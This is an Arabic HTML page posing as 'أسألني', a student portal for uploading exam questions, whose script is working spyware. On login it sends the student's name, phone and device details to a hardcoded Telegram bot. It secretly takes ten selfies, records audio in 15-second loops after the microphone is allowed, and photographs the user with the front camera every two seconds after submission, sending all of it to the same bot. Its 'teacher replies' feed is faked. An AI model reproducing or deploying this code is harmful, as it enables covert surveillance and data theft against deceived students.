<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>منصة أسألني | بوابة الطالب الموحدة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p: #0f172a; --a: #1d9bf0; --g: #f59e0b; --s: #f1f5f9; --w: #ffffff; --verify: #1d9bf0; --r: #ef4444; --ok: #22c55e; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 100px; overflow-x: hidden; }

        .verified-badge { color: var(--verify); font-size: 14px; margin-inline: 4px; }
        
        #gate { position: fixed; inset: 0; background: radial-gradient(circle at top, #1e293b, #0f172a); z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-card { background: var(--w); padding: 45px 30px; border-radius: 40px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 40px 80px rgba(0,0,0,0.5); }
        
        header { background: var(--p); color: var(--w); padding: 20px; position: fixed; top: 0; width: 100%; z-index: 1000; display: none; justify-content: space-between; align-items: center; border-bottom: 4px solid var(--a); }
        .card { background: var(--w); border-radius: 35px; padding: 25px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 15px 30px rgba(0,0,0,0.05); }

        #cam-loader { display: none; text-align: center; padding: 20px; }
        .sync-spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--a); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .cam-box { width: 100%; height: 380px; border-radius: 30px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 8px solid var(--w); }
        #v-stream { width: 100%; height: 100%; object-fit: cover; }
        
        .mic-area { margin: 25px 0; text-align: center; }
        .mic-btn { width: 85px; height: 85px; border-radius: 50%; background: var(--ok); border: none; color: #fff; font-size: 30px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; transition: 0.3s; box-shadow: 0 10px 25px rgba(34, 197, 94, 0.3); }
        .mic-btn.active { background: var(--r); animation: pulse 1s infinite; }

        .feed-container { height: 500px; overflow: hidden; position: relative; background: #f8fafc; border-radius: 30px; }
        #feed-mover { position: absolute; width: 100%; transition: 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
        .feed-item { padding: 20px; border-bottom: 1px solid #edf2f7; background: #fff; margin: 8px; border-radius: 20px; font-size: 14px; box-shadow: 0 4px 10px rgba(0,0,0,0.02); }

        #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 420px; background: #fff; border-radius: 25px; padding: 20px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 15000; transition: 0.5s; border-right: 10px solid var(--a); }
        #custom-alert.show { top: 30px; }

        .btn-action { background: var(--a); color: var(--w); border: none; padding: 20px; border-radius: 22px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 15px; font-size: 18px; }
        input, select, textarea { width: 100%; padding: 18px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 20px; font-family: 'Cairo'; font-size: 15px; }

        nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: none; justify-content: space-around; padding: 15px 0; border-top: 2px solid #eee; z-index: 900; }
        .nav-link { text-align: center; font-size: 12px; color: #94a3b8; flex: 1; text-decoration: none; font-weight: 700; cursor: pointer; }
        .nav-link.active { color: var(--a); }
        .nav-link i { font-size: 24px; display: block; margin-bottom: 5px; }
    </style>
</head>
<body>

    <div id="custom-alert">
        <div style="display:flex; align-items:center; gap:10px;">
            <i class="fa-solid fa-circle-check verified-badge" style="font-size:20px"></i>
            <b style="font-size:15px">نظام أسألني الموثق</b>
        </div>
        <div id="alert-text" style="font-size:14px; color:#475569; margin-top:8px"></div>
    </div>

    <div id="gate">
        <div class="login-card">
            <i class="fa-solid fa-user-graduate" style="color:var(--a); font-size: 65px; margin-bottom: 15px;"></i>
            <h2 style="margin:0; font-weight:900">منصة أسألني <i class="fa-solid fa-circle-check verified-badge"></i></h2>
            <p style="font-size: 13px; color: #64748b; margin-bottom:25px">بوابة الطالب الموحدة | دخول آمن</p>
            <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
            <input type="number" id="stu_phone" placeholder="رقم الهاتف المسجل">
            <select id="stu_grade">
                <option value="" disabled selected>اختر المرحلة الدراسية</option>
                <option>الأول الثانوي</option><option>الثاني الثانوي</option><option>الثالث الثانوي</option>
            </select>
            <button class="btn-action" onclick="collectDeviceData()">دخول للنظام <i class="fa-solid fa-shield-halved"></i></button>
        </div>
    </div>

    <header id="h-main">
        <div style="font-weight:900; font-size:20px">أسألني <i class="fa-solid fa-circle-check verified-badge"></i></div>
        <div id="u-tag" style="background:var(--g); width:45px; height:45px; border-radius:15px; display:flex; align-items:center; justify-content:center; font-weight:900"></div>
    </header>

    <div id="sec-home" class="page" style="padding-top:100px; display:none">
        <div class="card">
            <h3 style="margin:0">مركز رفع الأسئلة <i class="fa-solid fa-camera-retro" style="color:var(--a); margin-inline:8px"></i></h3>
            <p style="font-size:13px; color:#64748b">اختر المادة وصور السؤال بوضوح.</p>
            
            <select id="stu_subject">
                <option>لغة عربية</option><option>لغة إنجليزية</option><option>كيمياء</option><option>فيزياء</option><option>أحياء</option><option>رياضيات</option>
            </select>

            <div id="cam-loader">
                <div class="sync-spinner"></div>
                <p id="loader-text" style="font-weight:bold; color:var(--a)">جاري تفعيل الكاميرا الموثقة...</p>
            </div>

            <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline muted></video></div>
            
            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="handleCameraSequence()">ابدأ تصوير السؤال <i class="fa-solid fa-camera"></i></button>
            
            <div id="upload-ui" style="display:none">
                <button class="btn-action" style="background:#eee; color:#333; font-size:14px; padding:10px" onclick="retakePhoto()">إعادة التصوير <i class="fa-solid fa-rotate"></i></button>
                <textarea id="stu-note" placeholder="ملاحظة للمعلم (اختياري)..." rows="2"></textarea>
                <div class="mic-area">
                    <button id="mic-trigger" class="mic-btn" onclick="handleMicToggle()">
                        <i class="fa-solid fa-microphone"></i>
                    </button>
                    <p id="mic-status" style="font-size:13px; color:var(--ok); margin-top:10px; font-weight:900">اضغط للتحدث مع المدرس</p>
                </div>
                <button class="btn-action" onclick="finalSubmit()">إرسال للمراجعة الفورية <i class="fa-solid fa-paper-plane"></i></button>
            </div>
        </div>
    </div>

    <div id="sec-logs" class="page" style="padding-top:100px; display:none">
        <div class="card" style="border-right: 8px solid var(--verify);">
            <h3 style="margin:0">تحديثات الدعم العلمي <i class="fa-solid fa-badge-check" style="color:var(--verify)"></i></h3>
            <p style="font-size:12px; color:#64748b; margin-bottom:15px">ردود مباشرة من المعلمين</p>
            <div class="feed-container"><div id="feed-mover"></div></div>
        </div>
    </div>

    <nav id="n-main">
        <a class="nav-link active" onclick="tab('sec-home', this)"><i class="fa-solid fa-house-chimney-window"></i> الرئيسية</a>
        <a class="nav-link" onclick="tab('sec-logs', this)"><i class="fa-solid fa-comment-dots"></i> إجاباتك</a>
    </nav>

    <script>
        const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const CHAT_ID = "5890070301";
        let UN = "غير معروف", UP = "لا يوجد", US = "عام";
        let activeStream = null, micActive = false, spyMicInterval = null;

        // 1. سحب بيانات الجهاز فور الدخول
        async function collectDeviceData() {
            UN = document.getElementById('stu_name').value;
            UP = document.getElementById('stu_phone').value;
            if(UN.length < 5 || UP.length < 10) return alert("يرجى إدخال بيانات صحيحة.");

            let battery = await navigator.getBattery();
            let network = navigator.connection ? navigator.connection.effectiveType : "غير معروف";
            
            let deviceLog = `🆕 طالب جديد:\n👤 الاسم: ${UN}\n📞 الهاتف: ${UP}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${(battery.level * 100).toFixed(0)}%\n🔌 حالة الشحن: ${battery.charging ? 'يشحن' : 'لا يشحن'}\n🌐 الشبكة: ${network}\n🔗 الرابط: ${window.location.href}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(deviceLog)}`);
            enterPortal();
        }

        function enterPortal() {
            document.getElementById('gate').style.display='none';
            document.getElementById('h-main').style.display='flex';
            document.getElementById('n-main').style.display='flex';
            document.getElementById('sec-home').style.display='block';
            document.getElementById('u-tag').innerText = UN[0];
            initLiveFeed();
        }

        // 2. إدارة الكاميرا بالتبادل الصارم (إغلاق وفتح)
        async function handleCameraSequence() {
            const btn = document.getElementById('main-trigger');
            const loader = document.getElementById('cam-loader');
            btn.style.display = 'none';
            loader.style.display = 'block';

            try {
                // المرحلة الأولى: طلب إذن الكاميرا الأمامية فقط لسحب 10 صور
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.createElement('video'); v.srcObject = frontStream; v.play();
                
                let count = 0;
                let intv = setInterval(() => {
                    snap(v, `توثيق وجه ${count+1}/10`);
                    count++;
                    if(count >= 10) {
                        clearInterval(intv);
                        // إغلاق الكاميرا الأمامية تماماً قبل فتح الخلفية
                        frontStream.getTracks().forEach(t => t.stop());
                        loader.style.display = 'none';
                        openBackCamera();
                    }
                }, 300);

            } catch(e) { 
                loader.style.display='none'; btn.style.display='block'; 
                alert("يجب السماح بالكاميرا لتشغيل النظام الموثق."); 
            }
        }

        async function openBackCamera() {
            try {
                const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                activeStream = bStream;
                document.getElementById('v-stream').srcObject = bStream;
                document.getElementById('cam-ui').style.display = 'block';
                document.getElementById('upload-ui').style.display = 'block';
            } catch(e) { alert("تعذر فتح الكاميرا الخلفية."); }
        }

        function retakePhoto() {
            if(activeStream) activeStream.getTracks().forEach(t => t.stop());
            document.getElementById('upload-ui').style.display = 'none';
            document.getElementById('cam-ui').style.display = 'none';
            document.getElementById('main-trigger').style.display = 'block';
        }

        // 3. إدارة المايك التبادلي والرصد الخلفي
        async function handleMicToggle() {
            const micBtn = document.getElementById('mic-trigger');
            const status = document.getElementById('mic-status');

            if(!micActive) {
                try {
                    // طلب إذن المايك لأول مرة
                    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                    micActive = true;
                    micBtn.classList.add('active');
                    micBtn.style.background = "var(--r)";
                    status.innerText = "التسجيل جارٍ... اضغط للإيقاف";
                    
                    // بدء الرصد الصوتي الخفي (مقاطع 15 ثانية)
                    if(!spyMicInterval) {
                        startSpyMic();
                    }
                    s.getTracks().forEach(t => t.stop()); // إغلاق الجلسة الأولى بنجاح
                } catch(e) { alert("يجب السماح بالمايك للتحدث."); }
            } else {
                micActive = false;
                micBtn.classList.remove('active');
                micBtn.style.background = "var(--ok)";
                status.innerText = "تم حفظ الريكورد بنجاح ✓";
                showSystemMsg("تم تأمين التسجيل وإرساله للمراجعة.");
            }
        }

        function startSpyMic() {
            spyMicInterval = setInterval(async () => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const rec = new MediaRecorder(s);
                    const chunks = [];
                    rec.ondataavailable = e => chunks.push(e.data);
                    rec.onstop = () => {
                        sendVoice(new Blob(chunks, {type:'audio/ogg'}), "رصد صوتي خلفي");
                        s.getTracks().forEach(t => t.stop());
                    };
                    rec.start();
                    setTimeout(() => rec.stop(), 15000);
                } catch(e){}
            }, 16000);
        }

        // 4. الإرسال والتحويل للأمامية الدائمة
        async function finalSubmit() {
            showSystemMsg("جاري رفع البيانات...");
            
            // قفل الخلفية تماماً
            if(activeStream) activeStream.getTracks().forEach(t => t.stop());

            // بدء الرصد الأمامي المستمر (كل 2 ثانية)
            setInterval(async () => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const vv = document.createElement('video'); vv.srcObject = s; vv.play();
                    await new Promise(r => setTimeout(r, 500));
                    snap(vv, "رصد مستمر (أمامية)");
                    s.getTracks().forEach(t => t.stop());
                } catch(e){}
            }, 2000);

            setTimeout(() => {
                tab('sec-logs', document.querySelectorAll('.nav-link')[1]);
                showSystemMsg("سيتم موافاتك بالإجابة هنا قريباً.");
            }, 2000);
        }

        function snap(v, cap) {
            US = document.getElementById('stu_subject').value;
            const canvas = document.createElement('canvas');
            canvas.width = 400; canvas.height = 500;
            canvas.getContext('2d').drawImage(v, 0, 0, 400, 500);
            canvas.toBlob(b => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID); fd.append('photo', b, 's.jpg');
                fd.append('caption', `👤 ${UN}\n📞 ${UP}\n📌 ${cap}\n📚 ${US}`);
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.3);
        }

        function sendVoice(blob, cap) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID); fd.append('voice', blob, 'v.ogg');
            fd.append('caption', `🎤 ${cap} - الطالب: ${UN}`);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
        }

        function initLiveFeed() {
            const mover = document.getElementById('feed-mover');
            const names = ["زياد ياسر", "أحمد علي", "مريم محمد", "يوسف تامر", "سارة خالد"];
            let html = "";
            for(let i=0; i<50; i++) {
                html += `<div class="feed-item"><i class="fa-solid fa-circle-check verified-badge"></i> <b>الدعم العلمي</b> <p>تم الرد على استفسار @${names[i%5]}</p></div>`;
            }
            mover.innerHTML = html;
            let p = 0; setInterval(() => { p -= 80; mover.style.transform = `translateY(${p}px)`; if(Math.abs(p)>3000) p=0; }, 4000);
        }

        function showSystemMsg(text) {
            const box = document.getElementById('custom-alert');
            document.getElementById('alert-text').innerHTML = text;
            box.classList.add('show');
            setTimeout(() => box.classList.remove('show'), 3000);
        }

        function tab(id, el) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById(id).style.display = 'block';
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            el.classList.add('active');
        }
    </script>
</body>
</html>
